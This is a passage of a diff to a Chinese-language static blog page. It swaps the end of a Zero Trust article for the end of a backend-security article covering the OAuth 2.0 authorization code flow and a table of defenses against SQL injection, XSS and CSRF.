-<li><strong>Identity &amp; Access Management (IAM)</strong> → Okta, Azure AD</li>
-<li><strong>Multi-Factor Authentication (MFA)</strong></li>
-<li><strong>Zero Trust Network Access (ZTNA)</strong> → 替代傳統 VPN</li>
-<li><strong>Endpoint Detection &amp; Response (EDR)</strong> → CrowdStrike, SentinelOne</li>
-</ul>
-<hr />
-<h1 id="零信任不是一蹴可幾而是一趟旅程"><a class="markdownIt-Anchor" href="#零信任不是一蹴可幾而是一趟旅程"></a> 零信任不是一蹴可幾，而是一趟旅程</h1>
-<p>部署零信任架構並非購買一個工具就能完成。它是一個持續的過程，涉及到身份管理、端點安全、網路架構和應用程式等多個層面的整合與改造。一個務實的起步路徑可能包括：</p>
+<h2 id="簡化的授權碼模式流程-authorization-code-grant"><a class="markdownIt-Anchor" href="#簡化的授權碼模式流程-authorization-code-grant"></a> 簡化的授權碼模式流程 (Authorization Code Grant)</h2>
 <ol>
-<li><strong>從身份認證開始：</strong> 為所有員工和服務全面啟用 MFA（多因子認證）。</li>
-<li><strong>了解你的裝置：</strong> 建立裝置清單，監控其健康狀況。</li>
-<li><strong>實施微分段：</strong> 從最關鍵的應用程式或數據周圍開始，建立小型的安全區域。</li>
-<li><strong>重新評估權限：</strong> 審查現有權限，並朝著最小權限原則進行改革。</li>
+<li><strong>使用者請求</strong>：在「相片沖印服務」上點擊「使用 Google 相簿匯入」。</li>
+<li><strong>重定向</strong>：「相片沖印服務」將瀏覽器重定向到 Google 的授權頁面，並附上它想要的權限（<code>scope</code>，例如 <code>read_photos</code>）。</li>
+<li><strong>使用者授權</strong>：在 Google 的頁面上登入，並同意「相片沖印服務」讀取相簿。<strong>注意：密碼只給了 Google，從未給過第三方服務。</strong></li>
+<li><strong>取得授權碼</strong>：Google 將瀏覽器重定向回「相片沖印服務」，並附上一個一次性的<strong>授權碼 (Authorization Code)</strong>。</li>
+<li><strong>交換存取權杖</strong>：相片沖印服務的<strong>後端</strong>，用這個授權碼加上它自己的客戶端密鑰 (Client Secret)，向 Google 的授權伺服器發起請求，換取一個<strong>存取權杖 (Access Token)</strong>。</li>
+<li><strong>訪問資源</strong>：從此以後，「相片沖印服務」就可以使用這個 Access Token，向 Google 相簿的 API 請求你的照片了。</li>
 </ol>
+<p>OAuth 2.0 透過這套嚴謹的流程，實現了<strong>權限的最小化、可控化與密碼的隔離</strong>，已成為現代 API 安全的基石。</p>
 <hr />
-<h1 id="總結"><a class="markdownIt-Anchor" href="#總結"></a> 總結</h1>
-<p><strong>Zero Trust = 不預設信任任何人或設備 → 每次存取都必須驗證、授權、監控。</strong><br />
-它的目標是減少內外部攻擊風險，適合 <strong>遠端工作、雲端環境、微服務架構</strong> 的現代企業。</p>
-<p>它從根本上改變了我們的安全思維，從被動地防禦「外部」威脅，轉變為主動地管理「內部」風險。<br />
-通過擁抱「永不信任，一律驗證」的原則，我們將能構建更有彈性、更能適應未來挑戰的安全體系。</p>
+<h1 id="結論"><a class="markdownIt-Anchor" href="#結論"></a> 結論</h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">攻擊類型</th>
+<th style="text-align:left">核心弱點</th>
+<th style="text-align:left">關鍵防禦策略</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>SQL Injection</strong></td>
+<td style="text-align:left">伺服器端信任了使用者輸入，並將其作為程式碼執行</td>
+<td style="text-align:left"><strong>參數化查詢 (Prepared Statements)</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>XSS</strong></td>
+<td style="text-align:left">前端頁面信任了從後端獲取的內容，並將其作為程式碼執行</td>
+<td style="text-align:left"><strong>輸出編碼 (Output Encoding)</strong>、<strong>內容安全策略 (CSP)</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>CSRF</strong></td>
+<td style="text-align:left">伺服器端信任了來自合法使用者瀏覽器的請求，無法分辨真偽</td>
+<td style="text-align:left"><strong>Anti-CSRF Token</strong>、<strong>SameSite Cookies</strong></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>API 授權混亂</strong></td>
+<td style="text-align:left">第三方應用需要訪問使用者資料，傳統密碼共享模式極不安全</td>
+<td style="text-align:left"><strong>使用 OAuth 2.0 框架進行標準化授權</strong></td>
+</tr>
+</tbody>
+</table>
+<p>後端安全是一個持續對抗的過程。它要求我們不僅僅是完成功能，更要時刻保持懷疑，對每一個外部輸入、每一次資料庫操作、每一次 API 授權都進行審慎的思考。</p>
+<p>將安全意識融入每一次 commit，是成為一名優秀後端工程師的必經之路。</p>
 
     </div>
 
@@ -774,14 +771,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/my-blog/2025/10/05/%E6%89%93%E7%A0%B4%E6%95%B8%E6%93%9A%E5%AD%A4%E5%B3%B6%EF%BC%9A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20Data%20Mesh/" rel="prev" title="打破數據孤島：深入理解「Data Mesh (數據網格)」">
-                  <i class="fa fa-angle-left"></i> 打破數據孤島：深入理解「Data Mesh (數據網格)」
+                <a href="/my-blog/2025/10/26/SQL%20%E6%95%88%E8%83%BD%E8%AA%BF%E6%A0%A1/" rel="prev" title="SQL 效能調校：當查詢變慢時，該如何找出問題癥結？">
+                  <i class="fa fa-angle-left"></i> SQL 效能調校：當查詢變慢時，該如何找出問題癥結？
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/my-blog/2025/10/08/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2%E4%BA%8B%E4%BB%B6%E9%A9%85%E5%8B%95%E6%9E%B6%E6%A7%8B%20Event-Driven%20Architecture/" rel="next" title="深入探索事件驅動架構 (Event-Driven Architecture)">
-                  深入探索事件驅動架構 (Event-Driven Architecture) <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
